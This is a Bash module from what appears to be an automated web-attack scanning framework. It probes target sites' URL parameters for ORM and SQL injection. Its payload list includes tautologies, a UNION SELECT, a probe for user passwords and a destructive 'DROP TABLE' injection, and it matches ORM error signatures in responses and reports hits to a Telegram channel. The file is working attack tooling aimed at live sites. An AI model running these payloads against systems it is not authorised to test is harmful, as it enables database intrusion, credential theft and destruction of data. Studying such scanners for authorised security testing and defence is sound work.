#!/usr/bin/env bash
# modules/61_orm_injection.sh — Tier 4.2 ORM injection
# HQL/JPA (Hibernate/Java), ActiveRecord SQL fragments (Rails), Sequelize literal.

MODULE_NAME="orm_injection"
MODULE_DESC="ORM injection — HQL/JPA, ActiveRecord, Sequelize literal()"

_orm_finding() {
  db_add_finding "$1" "orm_injection" "$5" "$3" "$4" "$6" "${7:-medium}" 2>/dev/null
  log_warn "  ⚡ [$5/${7:-medium}] ORM $4: $3"
  if [[ "$5" == "high" ]]; then
    _telegram_send "🟠 *ORM — $4*
🌐 \`$2\` 🔗 \`$3\`
📋 ${6:0:250}" 2>/dev/null || true
  fi
}

_orm_probe() {
  local URL="$1" PARAM="$2" DOMAIN_ID="$3" DOMAIN="$4"

  # Baseline
  local BASELINE_URL; BASELINE_URL=$(echo "$URL" | python3 -c "
import sys, urllib.parse as u
url=sys.stdin.read().strip()
parts=u.urlparse(url); q=dict(u.parse_qsl(parts.query))
q['$PARAM']='1'
print(u.urlunparse(parts._replace(query=u.urlencode(q))))
")
  _h_get_noredirect "$BASELINE_URL" --connect-timeout 8
  local BASE_STATUS="$HTTP_LAST_STATUS"
  local BASE_LEN=${#HTTP_LAST_BODY}
  [[ "$BASE_STATUS" != "200" ]] && return 1

  # Payloads ORM-specific
  local PAYLOADS=(
    "1' OR '1'='1"
    "1) OR (1=1"
    '1) UNION SELECT NULL--'
    "1.id, password FROM users--"
    "1; DROP TABLE x--"
  )
  # ORM signature errors
  local ORM_PATTERN='org\.hibernate\.|HQL|QuerySyntaxException|ORA-|PG::|ActiveRecord::StatementInvalid|SequelizeDatabaseError|TypeORM|DBALException'

  for PAYLOAD in "${PAYLOADS[@]}"; do
    local TEST_URL; TEST_URL=$(echo "$URL" | python3 -c "
import sys, urllib.parse as u
url=sys.stdin.read().strip()
parts=u.urlparse(url); q=dict(u.parse_qsl(parts.query))
q['$PARAM']='''$PAYLOAD'''
print(u.urlunparse(parts._replace(query=u.urlencode(q))))
" 2>/dev/null)
    _h_get_noredirect "$TEST_URL" --connect-timeout 8
    local STATUS="$HTTP_LAST_STATUS"
    local BODY="${HTTP_LAST_BODY:0:3000}"

    # Error-based ORM detection
    if echo "$BODY" | grep -qE "$ORM_PATTERN"; then
      local ERR_LINE; ERR_LINE=$(echo "$BODY" | grep -oE "$ORM_PATTERN[^\"<]{0,80}" | head -1)
      _orm_finding "$DOMAIN_ID" "$DOMAIN" "$URL" "orm_error_${PARAM}" "high" \
        "ORM injection error-based en param '${PARAM}' con payload '${PAYLOAD}'. Error: ${ERR_LINE:0:150}. Verificar SQL injection real con sqlmap." \
        "high"
      return 0
    fi
  done
  return 1
}

module_run() {
  local DOMAIN="$1" DOMAIN_ID="$2" OUT_DIR="$3"
  log_phase "Módulo 61 — $MODULE_DESC: $DOMAIN"
  source "${SCRIPT_DIR}/core/http_analyzer.sh" 2>/dev/null

  local CANDIDATES
  CANDIDATES=$(sqlite3 "$DB_PATH" "
    SELECT DISTINCT u.url || '|' || p.param_name FROM urls u
    JOIN url_params p ON p.url=u.url AND p.domain_id=u.domain_id
    WHERE u.domain_id=${DOMAIN_ID}
      AND p.param_name IN ('id','order','sort','filter','q','search','where','having','limit','offset','select')
    LIMIT 25;" 2>/dev/null)
  [[ -z "$CANDIDATES" ]] && { log_info "  Sin params filter/sort candidatos"; return 0; }
  local TOTAL=0
  while IFS='|' read -r URL PARAM; do
    [[ -z "$URL" || -z "$PARAM" ]] && continue
    _orm_probe "$URL" "$PARAM" "$DOMAIN_ID" "$DOMAIN" && ((TOTAL++))
  done <<< "$CANDIDATES"
  log_ok "$MODULE_DESC: $TOTAL ORM injections"
}
